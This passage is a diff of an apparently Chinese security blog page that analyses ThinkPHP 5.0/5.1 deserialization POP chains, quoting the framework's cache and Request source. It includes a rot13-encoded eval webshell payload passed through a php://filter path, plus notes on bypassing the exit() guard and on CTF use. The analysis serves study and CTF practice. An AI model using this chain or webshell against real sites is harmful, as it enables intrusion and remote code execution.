+        $expire = $expire-&gt;getTimestamp() - time();
+    }
+    $filename = $this-&gt;getCacheKey($name, true);
+    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
+        $first = true;
+    }
+    $data = serialize($value);
+    if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
+        //数据压缩
+        $data = gzcompress($data, 3);
+    }
+    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+    $result = file_put_contents($filename, $data);
+    if ($result) {
+        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+        clearstatcache();
+        return true;
+    } else {
+        return false;
+    }
+}</code></pre>
 <p>之前曾经说过rce时缓存文件名不可控。但是在反序列化中就不存在这个问题。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">($name, $auto = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($name, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">        $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>文件名来自<code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code>.可控。<br>我们再看文件内容如何控制。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$filename = $this-&gt;getCacheKey($name, true);
 
+protected function getCacheKey($name, $auto = false)
+{
+    $name = md5($name);
+    if ($this-&gt;options[&#39;cache_subdir&#39;]) {
+        // 使用子目录
+        $name = substr($name, 0, 2) . DS . substr($name, 2);
+    }
+    if ($this-&gt;options[&#39;prefix&#39;]) {
+        $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;
+    }
+    $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;
+    $dir      = dirname($filename);
+
+    if ($auto &amp;&amp; !is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    return $filename;
+}</code></pre>
+<p>文件名来自<code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code>.可控。<br>我们再看文件内容如何控制。</p>
+<pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></pre>
 <p>这里就是pop链最大的难点了。<code>$data</code>其实并不可控。具体可以回溯到我刚刚上面放的一连串调用write方法的源码处。注意到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;write($messages, true, $type);
+}</code></pre>
 <p>write第二个参数是写死的<code>true</code>。它会一路传到File类作为<code>$data</code>写入。那么我们写文件等于控制不了写入内容。</p>
 <p>但是没有关系。set在这个file_put_contents下还调用了一个函数setTagItem</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        $key       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(<span class="string">','</span>, array_unique($value));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = $name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set($key, $value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function setTagItem($name)
+{
+    if ($this-&gt;tag) {
+        $key       = &#39;tag_&#39; . md5($this-&gt;tag);
+        $this-&gt;tag = null;
+        if ($this-&gt;has($key)) {
+            $value   = explode(&#39;,&#39;, $this-&gt;get($key));
+            $value[] = $name;
+            $value   = implode(&#39;,&#39;, array_unique($value));
+        } else {
+            $value = $name;
+        }
+        $this-&gt;set($key, $value, 0);
+    }
+}</code></pre>
 <p>在这里我们又一次调用了<code>set</code>。并且两个参数全部可控。所以最后循环调用我们就知道,写入文件的文件名为<code>md5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;</code>。内容为<code>$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p>
 <p>当然。这里显然存在一个绕过死亡exit的问题。使用rot13即可。然后rot13的payload绕不过默认的短标签。所以会需要加过滤器组合拳。除了常见的base64，WMCTF中使用到其他的<code>iconv</code>或者其他组合也是可行的。<br>原理不再赘述<br>那么。控制payload只要控制File类<code>$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;</code>即可。</p>
 <p>执行exp打的话。会发现存在两个文件。这是上面我们调用了两次<code>set</code>的缘故。而文件名由我们的<code>$tag</code>决定。具体计算方法也在上面提及了。当然最好的方法永远是本地自己打一遍。这样才能确信文件名这种远程不可见的东西。</p>
 <p>另外我相信大家肯定发现这个pop链有个变招。那就是linux,windows通用的写目录。回到上面getCacheKey</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$dir = dirname($filename);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$dir = dirname($filename);
+
+if ($auto &amp;&amp; !is_dir($dir)) {
+mkdir($dir, 0755, true);
+}</code></pre>
 <p>只要把<code>$this-&gt;options[&#39;path&#39;]</code>设置为目录的话。直接可以写755权限目录。</p>
 <p>SCTF2020 考察tp5.024那道题当时使用了python脚本高强度删文件。导致我以为当前目录不可写。但是换成写目录的payload后发现可以创建目录。并且可以存在相同于靶机重启时间的3分钟。所以使用这种payload黑盒探测不失为一种办法。</p>
 <h2 id="tp5-1-x-unserialize"><a href="#tp5-1-x-unserialize" class="headerlink" title="tp5.1.x-unserialize"></a>tp5.1.x-unserialize</h2><p>今天来跟下5.1的pop链。相比5.0而言思路大致相同。只有几个类的区别。并且其exp已经集成到phpggc上了。</p>
@@ -666,32 +1192,155 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>看到thinkphp\library\think\model\concern\Conversion.php<br>中的<code>toArray()</code> .我们同样寻找可以触发<code>__call()</code>的代码</p>
 <p><img src="/2020/08/05/Thinkphp-vuln/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>此处主要是<code>$relation-&gt;visible($name)</code>会触发<code>__call</code>.选择这一处的代码是因为,relation来自<code>$this-&gt;getRelation($key)</code>.<code>$name</code>来自<code>$this-&gt;append</code>.<br>看到getRelation</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getRelation($name = null)
+{
+    if (is_null($name)) {
+        return $this-&gt;relation;
+    } elseif (array_key_exists($name, $this-&gt;relation)) {
+        return $this-&gt;relation[$name];
+    }
+    return;
+}</code></pre>
 <p>我们要进入<code>visble</code>的分支。必须要<code>$relation</code>为空。所以<code>$this-&gt;relation</code>直接置空即可。</p>
 <p>此时<code>$relation</code>由<code>$relation = $this-&gt;getAttr($key);</code>决定。它会依次调用\thinkphp\library\think\model\concern\Attribute.php 的getAttr()与getData()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $notFound = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php"> public function getAttr($name, &amp;$item = null)
+{
+    try {
+        $notFound = false;
+        $value    = $this-&gt;getData($name);
+    } catch (InvalidArgumentException $e) {
+        ......
 
+public function getData($name = null)
+{
+    if (is_null($name)) {
+        return $this-&gt;data;
+    } elseif (array_key_exists($name, $this-&gt;data)) {
+        return $this-&gt;data[$name];
+    } elseif (array_key_exists($name, $this-&gt;relation)) {
+        return $this-&gt;relation[$name];
+    }
+    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);
+}</code></pre>
 <p>这样就能确认我们的<code>$relation</code>来自Attribute类的<code>$this-&gt;data[$name]</code>.</p>
 <p>现在需要注意的是。我们必须得找到一个既能调用Conversion还能调用Attribute属性的类。即继承了Attribute类和Conversion类的子类。这个其实就是我们之前5.0链子中用过的Model.php。<br>加上Model是抽象类。所以编写exp中使用它的子类Pivot实例化。这点不必多说。</p>
 <p>接下来看<code>$relation-&gt;visible($name)</code>中的<code>$name</code>.它是遍历<code>$this-&gt;append</code>得到的。可控。只需注意将其赋值为数组即可。(因为要进入<code>if (is_array($name))</code>的分支)</p>
 <p>既然已经拥有触发<code>__call</code>的条件了。我们现在找一个可用的<code>__call</code>。5.1版本中的gadget就是来自Request类的<code>__call</code>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>显然<code>$this-&gt;hook</code>可以让我们控制为<code>[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]</code>这个数组任意调用方法。但是注意<code>array_unshift($args, $this)</code>会强行把<code>$this</code>放到<code>$args</code>数组的第一位。其后果是怎样的呢？我们看下<code>call_user_func_array</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,<span class="string">"arbitrary method"</span>],[<span class="keyword">$this</span>,$arg])</span><br><span class="line">=&gt;</span><br><span class="line">$obj-&gt;$func(<span class="keyword">$this</span>,$argv)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __call($method, $args)
+{
+    if (array_key_exists($method, $this-&gt;hook)) {
+        array_unshift($args, $this);
+        return call_user_func_array($this-&gt;hook[$method], $args);
+    }
 
+    throw new Exception(&#39;method not exists:&#39; . static::class . &#39;-&gt;&#39; . $method);
+}</code></pre>
+<p>显然<code>$this-&gt;hook</code>可以让我们控制为<code>[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]</code>这个数组任意调用方法。但是注意<code>array_unshift($args, $this)</code>会强行把<code>$this</code>放到<code>$args</code>数组的第一位。其后果是怎样的呢？我们看下<code>call_user_func_array</code></p>
+<pre><code class="php">call_user_func_array([$obj,&quot;arbitrary method&quot;],[$this,$arg])
+=&gt;
+$obj-&gt;$func($this,$argv)</code></pre>
 <p>这种方法执行几乎没有。所以这就限制我们要找一个不受这种调用方式影响的函数。</p>
 <p>在以前tp5的漏洞分析中,曾经用到过<code>think\Request</code>类中的input 方法。里面有<code>call_user_func($filter,$data)</code>可以用于命令执行。<br>但是前面说过， <code>$args</code> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。</p>
 <p>整个Request类中一共有7处调用input方法的其他方法。我们选择<code>param</code>方法为例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (!$this-&gt;mergeParam) {
+        $method = $this-&gt;method(true);
 
+        // 自动获取请求变量
+        switch ($method) {
+            case &#39;POST&#39;:
+                $vars = $this-&gt;post(false);
+                break;
+            case &#39;PUT&#39;:
+            case &#39;DELETE&#39;:
+            case &#39;PATCH&#39;:
+                $vars = $this-&gt;put(false);
+                break;
+            default:
+                $vars = [];
+        }
+
+        // 当前请求参数和URL地址中的参数合并
+        $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+
+        $this-&gt;mergeParam = true;
+    }
+
+    if (true === $name) {
+        // 获取包含文件上传信息的数组
+        $file = $this-&gt;file();
+        $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;
+
+        return $this-&gt;input($data, &#39;&#39;, $default, $filter);
+    }
+
+    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+}</code></pre>
 <p>调用了<code>input</code>方法但是只有一个<code>$param</code>是可控的。所以还要继续找调用<code>param</code>的方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result   = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function isAjax($ajax = false)
+{
+    $value  = $this-&gt;server(&#39;HTTP_X_REQUESTED_WITH&#39;);
+    $result = &#39;xmlhttprequest&#39; == strtolower($value) ? true : false;
+
+    if (true === $ajax) {
+        return $result;
+    }
+
+    $result   = $this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;
+    $this-&gt;mergeParam = false;
+    return $result;
+}</code></pre>
 <p>isAjax方法返回值由<code>$this-&gt;config[&#39;var_ajax&#39;]</code>控制。那么等于控制了param的参数<code>$name</code>.等于控制了input 的参数<code>$name</code>.</p>
 <p>最后再来到input方法这看调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (false === $name) {
+        // 获取原始数据
+        return $data;
+    }
 
+    $name = (string) $name;
+    if (&#39;&#39; != $name) {
+        // 解析name
+        if (strpos($name, &#39;/&#39;)) {
+            list($name, $type) = explode(&#39;/&#39;, $name);
+        }
+
+        $data = $this-&gt;getData($data, $name);
+
+        if (is_null($data)) {
+            return $default;
+        }
+
+        if (is_object($data)) {
+            return $data;
+        }
+    }
+
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+        if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) {
+            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
+            $this-&gt;arrayReset($data);
+        }
+    } else {
+        $this-&gt;filterValue($data, $name, $filter);
